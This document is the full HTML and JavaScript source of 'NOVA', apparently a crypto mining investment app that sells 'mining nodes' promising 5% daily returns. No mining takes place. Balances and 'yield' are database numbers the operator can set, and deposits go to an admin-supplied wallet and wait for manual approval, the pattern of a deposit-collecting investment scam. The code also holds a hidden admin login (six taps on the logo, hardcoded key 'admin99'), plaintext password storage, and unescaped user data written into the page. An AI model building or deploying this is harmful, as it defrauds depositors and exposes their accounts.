<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Institutional Global</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --n-gold: #D4AF37; --n-black: #0F172A; --n-bg: #F8FAFC; }
        body { background: var(--n-bg); font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; }
        .nova-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 24px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.02); overflow: hidden; }
        .node-img { height: 120px; width: 100%; object-fit: cover; background: linear-gradient(45deg, #1e293b, #334155); }
        .btn-gold { background: linear-gradient(135deg, #B8860B, #D4AF37); color: white; border-radius: 14px; font-weight: 700; transition: 0.3s; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; }
        .screen { display: none; padding-bottom: 110px; animation: fadeIn 0.4s ease; }
        .active-screen { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255,255,255,0.9); backdrop-filter: blur(10px); border-top: 1px solid #f1f5f9; display: flex; justify-content: space-around; padding: 15px; z-index: 100; }
        .nav-item { color: #94a3b8; font-size: 10px; font-weight: 700; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-item.active { color: #B8860B; }
        .p-input { background: #f1f5f9; border: 1px solid transparent; width: 100%; padding: 16px; border-radius: 16px; outline: none; margin-bottom: 12px; font-size: 13px; transition: 0.3s; }
        .p-input:focus { border-color: #D4AF37; background: #fff; box-shadow: 0 0 0 4px rgba(212,175,55,0.1); }
        .modal { display: none; position: fixed; inset: 0; background: white; z-index: 1000; padding: 25px; overflow-y: auto; }
        .method-card { border: 2px solid #f1f5f9; border-radius: 16px; padding: 15px; display: flex; align-items: center; gap: 12px; cursor: pointer; transition: 0.2s; }
        .method-card.selected { border-color: #D4AF37; background: #fffdf5; }
    </style>
</head>
<body>

    <div id="global-msg" class="hidden bg-[#0F172A] text-[#D4AF37] p-3 text-[10px] font-bold text-center uppercase tracking-widest"></div>

    <div id="auth-screen" class="min-h-screen flex flex-col p-10 justify-center active-screen">
        <div class="mb-12 text-center">
            <h1 onclick="handleTaps()" class="text-5xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[9px] text-gray-400 font-bold uppercase tracking-[6px] mt-3">Advanced Mining Protocol</p>
        </div>
        <input type="text" id="u-id" placeholder="Access ID" class="p-input">
        <input type="password" id="u-pw" placeholder="Security Code" class="p-input">
        <input type="text" id="adm-key" placeholder="Admin Master" class="hidden p-input border-red-200">
        <button onclick="auth()" class="w-full btn-gold py-5 shadow-xl shadow-yellow-600/20">Initialize Core</button>
        <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-10 text-slate-400 font-bold uppercase cursor-pointer">Register New Entity</p>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white sticky top-0 z-50">
            <h2 class="font-black text-2xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="flex items-center gap-5">
                <a id="tg-link" href="#" class="text-sky-500 text-xl"><i class="fa-brands fa-telegram"></i></a>
                <i onclick="logout()" class="fa-solid fa-power-off text-slate-300 text-xl"></i>
            </div>
        </header>

        <div id="dash-screen" class="screen active-screen px-5">
            <div class="nova-card p-10 mb-6 bg-slate-900 text-center relative">
                <div class="absolute top-0 left-0 w-full h-full opacity-10 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]"></div>
                <p class="text-[10px] text-slate-400 font-black uppercase tracking-widest mb-3">Live Liquidity</p>
                <h1 id="main-bal" class="text-5xl font-extrabold text-[#D4AF37] tracking-tighter">$0.00</h1>
                <div id="v-daily" class="mt-6 inline-block bg-white/5 px-4 py-2 rounded-full text-[10px] font-bold text-green-400">Yield: +$0.00 / Day</div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('dep-modal')" class="nova-card p-6 flex flex-col items-center gap-2"><i class="fa-solid fa-arrow-down-to-bracket text-[#D4AF37] text-xl"></i><span class="text-[10px] font-black uppercase">Deposit</span></button>
                <button onclick="openModal('wd-modal')" class="nova-card p-6 flex flex-col items-center gap-2"><i class="fa-solid fa-paper-plane text-slate-400 text-xl"></i><span class="text-[10px] font-black uppercase">Withdraw</span></button>
            </div>

            <div class="nova-card p-6 mb-6 flex justify-between items-center border-dashed border-2 border-yellow-200">
                <div><p class="text-[9px] font-black text-slate-400 uppercase">Daily Voucher</p><p class="text-xs font-bold text-slate-800">Claim 0.10 - 0.50 USDT</p></div>
                <button id="bonus-btn" onclick="claimBonus()" class="btn-gold px-6 py-3">Claim</button>
            </div>
            
            <div class="nova-card p-6 mb-6">
                <input type="text" id="promo-inp" placeholder="ENTER PROMO CODE" class="p-input mb-4 py-3 text-center font-bold">
                <button onclick="applyPromo()" class="w-full btn-gold py-3">Apply Code</button>
            </div>
        </div>

        <div id="mine-screen" class="screen px-5">
            <h2 class="text-xl font-black mb-6 uppercase tracking-tighter">Mining <span class="text-[#D4AF37]">Nodes</span></h2>
            <div id="nodes-container" class="grid grid-cols-1 gap-6"></div>
        </div>

        <div id="hist-screen" class="screen px-5">
            <h2 class="text-xl font-black mb-6 uppercase tracking-tighter">Audit <span class="text-[#D4AF37]">Logs</span></h2>
            <div id="hist-container" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-house-chimney text-xl"></i><span>CORE</span></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-microchip text-xl"></i><span>NODES</span></div>
            <div onclick="nav('hist-screen')" class="nav-item" id="nav-hist"><i class="fa-solid fa-list-ul text-xl"></i><span>HISTORY</span></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-2xl font-black">FUNDING</h2>
            <i onclick="closeModal('dep-modal')" class="fa-solid fa-xmark text-xl text-slate-300"></i>
        </div>
        <div class="space-y-3 mb-8">
            <div onclick="selDep('Binance Pay')" class="method-card selected"><i class="fa-solid fa-coins text-yellow-500"></i><span class="text-sm font-bold">Binance Pay</span></div>
            <div onclick="selDep('Trust Wallet')" class="method-card"><i class="fa-solid fa-shield-halved text-blue-500"></i><span class="text-sm font-bold">Trust Wallet</span></div>
            <div onclick="selDep('MetaMask')" class="method-card"><i class="fa-solid fa-fox text-orange-500"></i><span class="text-sm font-bold">MetaMask</span></div>
            <div onclick="selDep('Violet Wallet')" class="method-card"><i class="fa-solid fa-wallet text-purple-500"></i><span class="text-sm font-bold">Violet Wallet</span></div>
        </div>
        <div class="nova-card p-6 bg-slate-50 mb-8 border-dashed border-2 border-slate-200">
            <p class="text-[10px] font-black text-slate-400 mb-2 uppercase">Official Address (USDT TRC20)</p>
            <p id="dep-addr" class="text-[11px] font-mono font-bold break-all">T-UPLOAD-ADDRESS-LATER-BY-ADMIN</p>
        </div>
        <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="p-input">
        <input type="text" id="dep-tid" placeholder="Transaction Hash / ID" class="p-input">
        <button onclick="reqFin('Deposit')" class="w-full btn-gold py-5">Verify Payment</button>
    </div>

    <div id="wd-modal" class="modal">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-2xl font-black">WITHDRAW</h2>
            <i onclick="closeModal('wd-modal')" class="fa-solid fa-xmark text-xl text-slate-300"></i>
        </div>
        <select id="wd-method" class="p-input font-bold">
            <option>Binance (USDT)</option>
            <option>EasyPaisa</option>
            <option>Trust Wallet</option>
            <option>MetaMask</option>
            <option>Global Bank Transfer</option>
        </select>
        <input type="number" id="wd-amt" placeholder="Withdraw Amount ($)" class="p-input">
        <input type="text" id="wd-acc" placeholder="Recipient Address / Account #" class="p-input">
        <button onclick="reqFin('Withdrawal')" class="w-full btn-gold py-5 bg-slate-900">Initiate Extraction</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-white z-[9999] p-8 overflow-y-auto">
        <div class="flex justify-between items-center mb-8">
            <h2 class="font-black text-xs uppercase tracking-widest text-red-500">System Controller</h2>
            <button onclick="location.reload()" class="bg-slate-100 p-3 rounded-xl"><i class="fa-solid fa-power-off"></i></button>
        </div>
        <div class="space-y-8">
            <div class="nova-card p-6 bg-slate-50">
                <h3 class="text-[10px] font-black mb-4 uppercase">Direct Balance Inject</h3>
                <input type="text" id="adm-uid" placeholder="User ID" class="p-input text-xs">
                <input type="number" id="adm-amt" placeholder="Amount ($)" class="p-input text-xs">
                <button onclick="injectBal()" class="w-full btn-gold py-3">Update User</button>
            </div>
            <div>
                <h3 class="text-[10px] font-black mb-4 uppercase">Requests Queue</h3>
                <div id="adm-requests" class="space-y-4"></div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const config = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(config); const db = getFirestore(app);
        let user = localStorage.getItem('nova_user'); let login = true; let sel_method = "Binance Pay";

        if(user) start(user);

        window.auth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(document.getElementById('adm-key').value === "admin99") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return alert("Credentials Required");
            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!login) {
                if(s.exists()) return alert("User already registered");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, bonusClaimed: false });
                localStorage.setItem('nova_user', id); start(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('nova_user', id); start(id);
            } else alert("Access Denied");
        };

        function start(id) {
            user = id; document.getElementById('auth-screen').style.display='none'; document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('main-bal').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "Yield: +$" + (data.daily || 0).toFixed(2) + " / Day";
                if(data.bonusClaimed) { document.getElementById('bonus-btn').disabled = true; document.getElementById('bonus-btn').innerText = "Claimed"; document.getElementById('bonus-btn').classList.add('opacity-50'); }
            });
            loadNodes(); loadHistory();
        }

        function loadNodes() {
            const c = document.getElementById('nodes-container'); c.innerHTML = "";
            const imgs = ["https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&q=80&w=400", "https://images.unsplash.com/photo-1644088379091-d574269d422f?auto=format&fit=crop&q=80&w=400"];
            for(let i=1; i<=20; i++) {
                let p = i === 1 ? 20 : (i === 20 ? 20000 : i * 500); 
                let d = (p * 0.05).toFixed(2);
                c.innerHTML += `<div class="nova-card">
                    <img src="${imgs[i%2]}" class="node-img">
                    <div class="p-6">
                        <div class="flex justify-between items-center mb-4">
                            <div><h4 class="text-xs font-black uppercase">NOVA UNIT v.${i}</h4><p class="text-[10px] text-green-500 font-bold">Yield: $${d}/Day</p></div>
                            <span class="text-lg font-black text-slate-800">$${p}</span>
                        </div>
                        <button onclick="buyNode(${p},${d})" class="w-full btn-gold py-3 text-[10px]">Deploy Machine</button>
                    </div>
                </div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().balance < p) return alert("Insufficient Balance");
            await updateDoc(uR, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Mining Node Active!");
        };

        window.selDep = (m) => {
            sel_method = m;
            document.querySelectorAll('.method-card').forEach(c => {
                c.classList.remove('selected');
                if(c.innerText.includes(m)) c.classList.add('selected');
            });
        };

        window.reqFin = async (type) => {
            const amt = parseFloat(document.getElementById(type=='Deposit'?'dep-amt':'wd-amt').value);
            if(!amt) return alert("Enter amount");
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(type === 'Withdrawal' && s.data().balance < amt) return alert("Low balance");
            if(type === 'Withdrawal') await updateDoc(uR, { balance: s.data().balance - amt });
            await addDoc(collection(db, "logs"), { 
                user, type, amount: amt, status: 'Pending', time: Date.now(), 
                method: type=='Deposit' ? sel_method : document.getElementById('wd-method').value,
                ref: type=='Deposit' ? document.getElementById('dep-tid').value : document.getElementById('wd-acc').value 
            });
            alert("Submission Received!"); closeModal(type=='Deposit'?'dep-modal':'wd-modal');
        };

        function loadHistory() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", user), orderBy("time", "desc")), s => {
                const c = document.getElementById('hist-container'); c.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    c.innerHTML += `<div class="nova-card p-5 flex justify-between items-center">
                        <div><p class="text-[8px] font-black text-slate-400 uppercase">${r.type} (${r.method})</p><p class="text-sm font-bold">$${r.amount}</p></div>
                        <span class="text-[10px] font-black ${r.status=='Success'?'text-green-500':'text-orange-400'}">${r.status}</span>
                    </div>`;
                });
            });
        }

        window.loadAdmin = () => {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const c = document.getElementById('adm-requests'); c.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    c.innerHTML += `<div class="nova-card p-6 bg-white border-l-4 ${r.type=='Deposit'?'border-green-500':'border-red-500'}">
                        <div class="mb-4"><p class="text-xs font-black uppercase">${r.user} - $${r.amount}</p><p class="text-[9px] text-slate-400 font-bold">${r.type} via ${r.method}</p><p class="text-[9px] font-mono mt-1">${r.ref}</p></div>
                        <div class="flex gap-3">
                            <button onclick="admAct('${d.id}','${r.user}',${r.amount},'${r.type}','Success')" class="flex-1 bg-green-500 text-white text-[9px] font-bold py-3 rounded-xl">APPROVE</button>
                            <button onclick="admAct('${d.id}','${r.user}',${r.amount},'${r.type}','Rejected')" class="flex-1 bg-red-500 text-white text-[9px] font-bold py-3 rounded-xl">REJECT</button>
                        </div>
                    </div>`;
                });
            });
        };

        window.admAct = async (id, u, a, t, s) => {
            if(s === 'Success' && t === 'Deposit') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            if(s === 'Rejected' && t === 'Withdrawal') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            await updateDoc(doc(db, "logs", id), { status: s });
        };

        window.injectBal = async () => { const uR = doc(db, "users", document.getElementById('adm-uid').value.toLowerCase().trim()); const s = await getDoc(uR); if(s.exists()) { await updateDoc(uR, { balance: s.data().balance + parseFloat(document.getElementById('adm-amt').value) }); alert("Injected!"); } };
        window.claimBonus = async () => { const uR = doc(db, "users", user); const s = await getDoc(uR); if(s.data().bonusClaimed) return; const b = (Math.random() * 0.4 + 0.1).toFixed(2); await updateDoc(uR, { balance: s.data().balance + parseFloat(b), bonusClaimed: true }); alert(`Bonus: $${b}`); };
        window.logout = () => { localStorage.removeItem('nova_user'); location.reload(); };
        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { login = !login; document.getElementById('m-text').innerText = login ? "Register New Entity" : "Return to Vault"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('nav-' + id.split('-')[0]).classList.add('active');
        };
    </script>
</body>
</html>
